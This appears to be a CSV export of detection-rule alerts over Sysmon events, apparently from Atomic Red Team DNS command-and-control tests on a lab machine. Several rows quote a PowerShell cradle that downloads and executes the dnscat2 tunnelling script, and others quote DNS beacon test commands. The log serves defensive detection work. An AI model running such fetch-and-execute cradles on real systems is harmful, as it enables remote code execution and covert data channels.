"2025-12-26 11:29:23.826 +01:00","Net Conn (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",3,"","","sysmon",175202,"Initiated: true ¦ Proto: udp ¦ SrcIP: 192.168.201.128 ¦ SrcPort: 50445 ¦ SrcHost: DESKTOP-G2OBL3D.localdomain ¦ TgtIP: 192.168.201.2 ¦ TgtPort: 53 ¦ TgtHost: - ¦ User: DESKTOP-G2OBL3D\student ¦ Proc: C:\Users\student\AppData\Local\Programs\Microsoft VS Code\Code.exe ¦ PID: 2052 ¦ PGUID: E9F06A57-623C-694E-E601-000000002400","DestinationIsIpv6: false ¦ DestinationPortName: domain ¦ RuleName: Usermode ¦ SourceIsIpv6: false ¦ UtcTime: 2025-12-26 10:29:22.655","Sysmon_3_Med_NetConn_RuleAlert.yml","e13c5fe0-73f1-4c0f-aef5-1bab99b4237b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:23.826 +01:00","Net Conn (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",3,"","","sysmon",175203,"Initiated: true ¦ Proto: tcp ¦ SrcIP: 192.168.201.128 ¦ SrcPort: 57028 ¦ SrcHost: DESKTOP-G2OBL3D.localdomain ¦ TgtIP: 13.107.213.44 ¦ TgtPort: 443 ¦ TgtHost: - ¦ User: DESKTOP-G2OBL3D\student ¦ Proc: C:\Users\student\AppData\Local\Programs\Microsoft VS Code\Code.exe ¦ PID: 2052 ¦ PGUID: E9F06A57-623C-694E-E601-000000002400","DestinationIsIpv6: false ¦ DestinationPortName: https ¦ RuleName: Usermode ¦ SourceIsIpv6: false ¦ UtcTime: 2025-12-26 10:29:22.739","Sysmon_3_Med_NetConn_RuleAlert.yml","e13c5fe0-73f1-4c0f-aef5-1bab99b4237b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:28.380 +01:00","Net Conn (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",3,"","","sysmon",175208,"Initiated: true ¦ Proto: udp ¦ SrcIP: 192.168.201.128 ¦ SrcPort: 50446 ¦ SrcHost: DESKTOP-G2OBL3D.localdomain ¦ TgtIP: 192.168.201.2 ¦ TgtPort: 53 ¦ TgtHost: - ¦ User: DESKTOP-G2OBL3D\student ¦ Proc: C:\Users\student\AppData\Local\Programs\Microsoft VS Code\Code.exe ¦ PID: 2512 ¦ PGUID: E9F06A57-6241-694E-E901-000000002400","DestinationIsIpv6: false ¦ DestinationPortName: domain ¦ RuleName: Usermode ¦ SourceIsIpv6: false ¦ UtcTime: 2025-12-26 10:29:27.128","Sysmon_3_Med_NetConn_RuleAlert.yml","e13c5fe0-73f1-4c0f-aef5-1bab99b4237b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:28.380 +01:00","Net Conn (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",3,"","","sysmon",175209,"Initiated: true ¦ Proto: udp ¦ SrcIP: 192.168.201.128 ¦ SrcPort: 50447 ¦ SrcHost: DESKTOP-G2OBL3D.localdomain ¦ TgtIP: 192.168.201.2 ¦ TgtPort: 53 ¦ TgtHost: - ¦ User: DESKTOP-G2OBL3D\student ¦ Proc: C:\Users\student\AppData\Local\Programs\Microsoft VS Code\Code.exe ¦ PID: 2512 ¦ PGUID: E9F06A57-6241-694E-E901-000000002400","DestinationIsIpv6: false ¦ DestinationPortName: domain ¦ RuleName: Usermode ¦ SourceIsIpv6: false ¦ UtcTime: 2025-12-26 10:29:27.286","Sysmon_3_Med_NetConn_RuleAlert.yml","e13c5fe0-73f1-4c0f-aef5-1bab99b4237b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:28.632 +01:00","Net Conn (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",3,"","","sysmon",175210,"Initiated: true ¦ Proto: tcp ¦ SrcIP: 192.168.201.128 ¦ SrcPort: 57033 ¦ SrcHost: DESKTOP-G2OBL3D.localdomain ¦ TgtIP: 195.202.131.200 ¦ TgtPort: 443 ¦ TgtHost: bu30007-008.cm.kabsi.at ¦ User: DESKTOP-G2OBL3D\student ¦ Proc: C:\Users\student\AppData\Local\Programs\Microsoft VS Code\Code.exe ¦ PID: 2512 ¦ PGUID: E9F06A57-6241-694E-E901-000000002400","DestinationIsIpv6: false ¦ DestinationPortName: https ¦ RuleName: Usermode ¦ SourceIsIpv6: false ¦ SourcePortName: - ¦ UtcTime: 2025-12-26 10:29:27.583","Sysmon_3_Med_NetConn_RuleAlert.yml","e13c5fe0-73f1-4c0f-aef5-1bab99b4237b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:43.574 +01:00","Net Conn (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",3,"","","sysmon",175215,"Initiated: true ¦ Proto: tcp ¦ SrcIP: 192.168.201.128 ¦ SrcPort: 57035 ¦ SrcHost: DESKTOP-G2OBL3D.localdomain ¦ TgtIP: 20.9.155.150 ¦ TgtPort: 443 ¦ TgtHost: - ¦ User: DESKTOP-G2OBL3D\student ¦ Proc: C:\Users\student\AppData\Local\Programs\Microsoft VS Code\Code.exe ¦ PID: 2512 ¦ PGUID: E9F06A57-6241-694E-E901-000000002400","DestinationIsIpv6: false ¦ DestinationPortName: https ¦ RuleName: Usermode ¦ SourceIsIpv6: false ¦ UtcTime: 2025-12-26 10:29:42.541","Sysmon_3_Med_NetConn_RuleAlert.yml","e13c5fe0-73f1-4c0f-aef5-1bab99b4237b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:27.956 +01:00","Proc Terminated","info","DESKTOP-G2OBL3D","Sysmon",5,"","","sysmon",175207,"Proc: C:\Users\student\AppData\Roaming\Code\User\globalStorage\ms-dotnettools.vscode-dotnet-runtime\.dotnet\9.0.11~x64~aspnetcore\dotnet.exe ¦ PID: 8960 ¦ PGUID: E9F06A57-6387-694E-5C02-000000002400","RuleName: - ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:29:27.952","Sysmon_5_Info_ProcTerm.yml","02353fdd-522c-48f8-9243-28d4830ebc1e","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:30:15.378 +01:00","Dynamic CSharp Compile Artefact","low","DESKTOP-G2OBL3D","Sysmon",11,"Evas","T1027.004","sysmon",175452,"Path: C:\Users\student\AppData\Local\Temp\3stwtxwi\3stwtxwi.cmdline ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9956 ¦ PGUID: E9F06A57-63B1-694E-5F02-000000002400","CreationUtcTime: 2025-12-26 10:30:15.342 ¦ RuleName: - ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:30:15.342","file_event_win_csharp_compile_artefact.yml","b80443dd-bc46-d0c8-3c01-9ddbb0b5c673","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:30:16.440 +01:00","Dynamic CSharp Compile Artefact","low","DESKTOP-G2OBL3D","Sysmon",11,"Evas","T1027.004","sysmon",175457,"Path: C:\Users\student\AppData\Local\Temp\v5tccl0z\v5tccl0z.cmdline ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9956 ¦ PGUID: E9F06A57-63B1-694E-5F02-000000002400","CreationUtcTime: 2025-12-26 10:30:16.416 ¦ RuleName: - ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:30:16.417","file_event_win_csharp_compile_artefact.yml","b80443dd-bc46-d0c8-3c01-9ddbb0b5c673","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:30:15.658 +01:00","Dynamic .NET Compilation Via Csc.EXE","med","DESKTOP-G2OBL3D","Sysmon",1,"Evas","T1027.004","sysmon",175453,"Cmdline: ""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"" /noconfig /fullpaths @""C:\Users\student\AppData\Local\Temp\3stwtxwi\3stwtxwi.cmdline"" ¦ Proc: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""powershell.exe"" & {IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/45836819b2339f0bb64eaf294f8cc783635e00c6/dnscat2.ps1') Start-Dnscat2 -Domain example.com -DNSServer 127.0.0.1} ¦ LID: 0x1894a ¦ LGUID: E9F06A57-5FE2-694E-4A89-010000000000 ¦ PID: 8044 ¦ PGUID: E9F06A57-63B7-694E-6102-000000002400 ¦ ParentPID: 9956 ¦ ParentPGUID: E9F06A57-63B1-694E-5F02-000000002400 ¦ Description: Visual C# Command Line Compiler ¦ Product: Microsoft® .NET Framework ¦ Company: Microsoft Corporation ¦ Hashes: MD5=53803CB67327CC873A1C88604D54A1D4,SHA256=AAE1DB57F898CA8BDA18590C56F86CED6D0EAD80C22033B76FDFE9119706F116,IMPHASH=2E6A9097FBA347A254DAC72662FE1259","CurrentDirectory: C:\Users\student\AppData\Local\Temp\ ¦ FileVersion: 4.8.9232.0 built by: NET481REL1LAST_C ¦ IntegrityLevel: High ¦ OriginalFileName: csc.exe ¦ ParentCommandLine: ""powershell.exe"" & {IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/45836819b2339f0bb64eaf294f8cc783635e00c6/dnscat2.ps1') Start-Dnscat2 -Domain example.com -DNSServer 127.0.0.1} ¦ ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-26 10:30:15.591","proc_creation_win_csc_susp_dynamic_compilation.yml","29fb510e-d79c-6420-e60d-c05b708a6f9e","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:30:16.471 +01:00","Dynamic .NET Compilation Via Csc.EXE","med","DESKTOP-G2OBL3D","Sysmon",1,"Evas","T1027.004","sysmon",175458,"Cmdline: ""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"" /noconfig /fullpaths @""C:\Users\student\AppData\Local\Temp\v5tccl0z\v5tccl0z.cmdline"" ¦ Proc: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""powershell.exe"" & {IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/45836819b2339f0bb64eaf294f8cc783635e00c6/dnscat2.ps1') Start-Dnscat2 -Domain example.com -DNSServer 127.0.0.1} ¦ LID: 0x1894a ¦ LGUID: E9F06A57-5FE2-694E-4A89-010000000000 ¦ PID: 9588 ¦ PGUID: E9F06A57-63B8-694E-6302-000000002400 ¦ ParentPID: 9956 ¦ ParentPGUID: E9F06A57-63B1-694E-5F02-000000002400 ¦ Description: Visual C# Command Line Compiler ¦ Product: Microsoft® .NET Framework ¦ Company: Microsoft Corporation ¦ Hashes: MD5=53803CB67327CC873A1C88604D54A1D4,SHA256=AAE1DB57F898CA8BDA18590C56F86CED6D0EAD80C22033B76FDFE9119706F116,IMPHASH=2E6A9097FBA347A254DAC72662FE1259","CurrentDirectory: C:\Users\student\AppData\Local\Temp\ ¦ FileVersion: 4.8.9232.0 built by: NET481REL1LAST_C ¦ IntegrityLevel: High ¦ OriginalFileName: csc.exe ¦ ParentCommandLine: ""powershell.exe"" & {IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/45836819b2339f0bb64eaf294f8cc783635e00c6/dnscat2.ps1') Start-Dnscat2 -Domain example.com -DNSServer 127.0.0.1} ¦ ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-26 10:30:16.424","proc_creation_win_csc_susp_dynamic_compilation.yml","29fb510e-d79c-6420-e60d-c05b708a6f9e","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:30:16.902 +01:00","Suspicious Execution of Hostname","low","DESKTOP-G2OBL3D","Sysmon",1,"Disc","T1082","sysmon",175461,"Cmdline: ""C:\WINDOWS\system32\HOSTNAME.EXE"" ¦ Proc: C:\Windows\System32\HOSTNAME.EXE ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""powershell.exe"" & {IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/45836819b2339f0bb64eaf294f8cc783635e00c6/dnscat2.ps1') Start-Dnscat2 -Domain example.com -DNSServer 127.0.0.1} ¦ LID: 0x1894a ¦ LGUID: E9F06A57-5FE2-694E-4A89-010000000000 ¦ PID: 7460 ¦ PGUID: E9F06A57-63B8-694E-6502-000000002400 ¦ ParentPID: 9956 ¦ ParentPGUID: E9F06A57-63B1-694E-5F02-000000002400 ¦ Description: Hostname APP ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=0411E7CFE0D452AFE541C1EA45033168,SHA256=8FF283FB7A282A9B2B30235016669DFE795665BCBB254FD17AC31FA9308D89D9,IMPHASH=8CB84C534505B1E47EF25FA2CD9A16BB","CurrentDirectory: C:\Users\student\AppData\Local\Temp\ ¦ FileVersion: 10.0.26100.2161 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: hostname.exe ¦ ParentCommandLine: ""powershell.exe"" & {IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/45836819b2339f0bb64eaf294f8cc783635e00c6/dnscat2.ps1') Start-Dnscat2 -Domain example.com -DNSServer 127.0.0.1} ¦ ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-26 10:30:16.889","proc_creation_win_hostname_execution.yml","cd4f18d8-b261-1a76-2600-f039cd6f0310","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:30:09.895 +01:00","PowerShell Download and Execution Cradles","high","DESKTOP-G2OBL3D","Sysmon",1,"Exec","T1059","sysmon",175445,"Cmdline: ""powershell.exe"" & {IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/45836819b2339f0bb64eaf294f8cc783635e00c6/dnscat2.ps1') Start-Dnscat2 -Domain example.com -DNSServer 127.0.0.1} ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe"" -exec bypass ¦ LID: 0x1894a ¦ LGUID: E9F06A57-5FE2-694E-4A89-010000000000 ¦ PID: 9956 ¦ PGUID: E9F06A57-63B1-694E-5F02-000000002400 ¦ ParentPID: 9132 ¦ ParentPGUID: E9F06A57-602B-694E-E700-000000002400 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CommandLine: ""powershell.exe"" & {IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/45836819b2339f0bb64eaf294f8cc783635e00c6/dnscat2.ps1') Start-Dnscat2 -Domain example.com -DNSServer 127.0.0.1} ¦ CurrentDirectory: C:\Users\student\AppData\Local\Temp\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-26 10:30:09.651","proc_creation_win_powershell_download_iex.yml","745811d2-f9b3-6c05-f1f8-b245b4d26b9f","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:30:09.895 +01:00","PowerShell Download Pattern","med","DESKTOP-G2OBL3D","Sysmon",1,"Exec","T1059.001","sysmon",175445,"Cmdline: ""powershell.exe"" & {IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/45836819b2339f0bb64eaf294f8cc783635e00c6/dnscat2.ps1') Start-Dnscat2 -Domain example.com -DNSServer 127.0.0.1} ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe"" -exec bypass ¦ LID: 0x1894a ¦ LGUID: E9F06A57-5FE2-694E-4A89-010000000000 ¦ PID: 9956 ¦ PGUID: E9F06A57-63B1-694E-5F02-000000002400 ¦ ParentPID: 9132 ¦ ParentPGUID: E9F06A57-602B-694E-E700-000000002400 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CommandLine: ""powershell.exe"" & {IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/45836819b2339f0bb64eaf294f8cc783635e00c6/dnscat2.ps1') Start-Dnscat2 -Domain example.com -DNSServer 127.0.0.1} ¦ CurrentDirectory: C:\Users\student\AppData\Local\Temp\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-26 10:30:09.651","proc_creation_win_powershell_download_patterns.yml","9c070b47-5e34-6e96-ccce-205111752ae3","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:30:09.895 +01:00","Suspicious PowerShell Invocations - Specific - ProcessCreation","med","DESKTOP-G2OBL3D","Sysmon",1,"Evas","","sysmon",175445,"Cmdline: ""powershell.exe"" & {IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/45836819b2339f0bb64eaf294f8cc783635e00c6/dnscat2.ps1') Start-Dnscat2 -Domain example.com -DNSServer 127.0.0.1} ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe"" -exec bypass ¦ LID: 0x1894a ¦ LGUID: E9F06A57-5FE2-694E-4A89-010000000000 ¦ PID: 9956 ¦ PGUID: E9F06A57-63B1-694E-5F02-000000002400 ¦ ParentPID: 9132 ¦ ParentPGUID: E9F06A57-602B-694E-E700-000000002400 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CommandLine: ""powershell.exe"" & {IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/45836819b2339f0bb64eaf294f8cc783635e00c6/dnscat2.ps1') Start-Dnscat2 -Domain example.com -DNSServer 127.0.0.1} ¦ CurrentDirectory: C:\Users\student\AppData\Local\Temp\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-26 10:30:09.651","proc_creation_win_powershell_invocation_specific.yml","e554e422-7cda-2292-0e64-7595a12743dd","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:30:09.895 +01:00","Malicious PowerShell Commandlets - ProcessCreation","high","DESKTOP-G2OBL3D","Sysmon",1,"Exec ¦ Disc","T1482 ¦ T1087 ¦ T1087.001 ¦ T1087.002 ¦ T1069.001 ¦ T1069.002 ¦ T1069 ¦ T1059.001","sysmon",175445,"Cmdline: ""powershell.exe"" & {IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/45836819b2339f0bb64eaf294f8cc783635e00c6/dnscat2.ps1') Start-Dnscat2 -Domain example.com -DNSServer 127.0.0.1} ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe"" -exec bypass ¦ LID: 0x1894a ¦ LGUID: E9F06A57-5FE2-694E-4A89-010000000000 ¦ PID: 9956 ¦ PGUID: E9F06A57-63B1-694E-5F02-000000002400 ¦ ParentPID: 9132 ¦ ParentPGUID: E9F06A57-602B-694E-E700-000000002400 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CommandLine: ""powershell.exe"" & {IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/45836819b2339f0bb64eaf294f8cc783635e00c6/dnscat2.ps1') Start-Dnscat2 -Domain example.com -DNSServer 127.0.0.1} ¦ CurrentDirectory: C:\Users\student\AppData\Local\Temp\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-26 10:30:09.651","proc_creation_win_powershell_malicious_cmdlets.yml","2f99fa24-ac46-0814-cbe5-85100e648050","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:47.613 +01:00","Non Interactive PowerShell Process Spawned","low","DESKTOP-G2OBL3D","Sysmon",1,"Exec","T1059.001","sysmon",174849,"Cmdline: ""powershell.exe"" & {Set-Location \""""C:\AtomicRedTeam\atomics\"""" .\T1071.004\src\T1071-dns-beacon.ps1 -Domain 127.0.0.1.nip.io -Subdomain atomicredteam -QueryType TXT -C2Interval 30 -C2Jitter 20 -RunTime 30} ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe"" -exec bypass ¦ LID: 0x1894a ¦ LGUID: E9F06A57-5FE2-694E-4A89-010000000000 ¦ PID: 4728 ¦ PGUID: E9F06A57-6323-694E-4B02-000000002400 ¦ ParentPID: 9132 ¦ ParentPGUID: E9F06A57-602B-694E-E700-000000002400 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CommandLine: ""powershell.exe"" & {Set-Location \""""C:\AtomicRedTeam\atomics\"""" .\T1071.004\src\T1071-dns-beacon.ps1 -Domain 127.0.0.1.nip.io -Subdomain atomicredteam -QueryType TXT -C2Interval 30 -C2Jitter 20 -RunTime 30} ¦ CurrentDirectory: C:\Users\student\AppData\Local\Temp\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-26 10:27:47.601","proc_creation_win_powershell_non_interactive_execution.yml","7b9c1012-0114-7467-278f-9c073249b3b7","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:49.596 +01:00","Non Interactive PowerShell Process Spawned","low","DESKTOP-G2OBL3D","Sysmon",1,"Exec","T1059.001","sysmon",175218,"Cmdline: ""powershell.exe"" & {Set-Location \""""C:\AtomicRedTeam\atomics\"""" .\T1071.004\src\T1071-dns-domain-length.ps1 -Domain 127.0.0.1.nip.io -Subdomain atomicredteamatomicredteamatomicredteamatomicredteamatomicredte -QueryType TXT} ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe"" -exec bypass ¦ LID: 0x1894a ¦ LGUID: E9F06A57-5FE2-694E-4A89-010000000000 ¦ PID: 9872 ¦ PGUID: E9F06A57-639D-694E-5D02-000000002400 ¦ ParentPID: 9132 ¦ ParentPGUID: E9F06A57-602B-694E-E700-000000002400 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CommandLine: ""powershell.exe"" & {Set-Location \""""C:\AtomicRedTeam\atomics\"""" .\T1071.004\src\T1071-dns-domain-length.ps1 -Domain 127.0.0.1.nip.io -Subdomain atomicredteamatomicredteamatomicredteamatomicredteamatomicredte -QueryType TXT} ¦ CurrentDirectory: C:\Users\student\AppData\Local\Temp\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-26 10:29:49.557","proc_creation_win_powershell_non_interactive_execution.yml","7b9c1012-0114-7467-278f-9c073249b3b7","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:30:09.895 +01:00","Non Interactive PowerShell Process Spawned","low","DESKTOP-G2OBL3D","Sysmon",1,"Exec","T1059.001","sysmon",175445,"Cmdline: ""powershell.exe"" & {IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/45836819b2339f0bb64eaf294f8cc783635e00c6/dnscat2.ps1') Start-Dnscat2 -Domain example.com -DNSServer 127.0.0.1} ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe"" -exec bypass ¦ LID: 0x1894a ¦ LGUID: E9F06A57-5FE2-694E-4A89-010000000000 ¦ PID: 9956 ¦ PGUID: E9F06A57-63B1-694E-5F02-000000002400 ¦ ParentPID: 9132 ¦ ParentPGUID: E9F06A57-602B-694E-E700-000000002400 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CommandLine: ""powershell.exe"" & {IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/45836819b2339f0bb64eaf294f8cc783635e00c6/dnscat2.ps1') Start-Dnscat2 -Domain example.com -DNSServer 127.0.0.1} ¦ CurrentDirectory: C:\Users\student\AppData\Local\Temp\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-26 10:30:09.651","proc_creation_win_powershell_non_interactive_execution.yml","7b9c1012-0114-7467-278f-9c073249b3b7","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:47.613 +01:00","Suspicious Program Names","high","DESKTOP-G2OBL3D","Sysmon",1,"Exec","T1059","sysmon",174849,"Cmdline: ""powershell.exe"" & {Set-Location \""""C:\AtomicRedTeam\atomics\"""" .\T1071.004\src\T1071-dns-beacon.ps1 -Domain 127.0.0.1.nip.io -Subdomain atomicredteam -QueryType TXT -C2Interval 30 -C2Jitter 20 -RunTime 30} ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe"" -exec bypass ¦ LID: 0x1894a ¦ LGUID: E9F06A57-5FE2-694E-4A89-010000000000 ¦ PID: 4728 ¦ PGUID: E9F06A57-6323-694E-4B02-000000002400 ¦ ParentPID: 9132 ¦ ParentPGUID: E9F06A57-602B-694E-E700-000000002400 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CommandLine: ""powershell.exe"" & {Set-Location \""""C:\AtomicRedTeam\atomics\"""" .\T1071.004\src\T1071-dns-beacon.ps1 -Domain 127.0.0.1.nip.io -Subdomain atomicredteam -QueryType 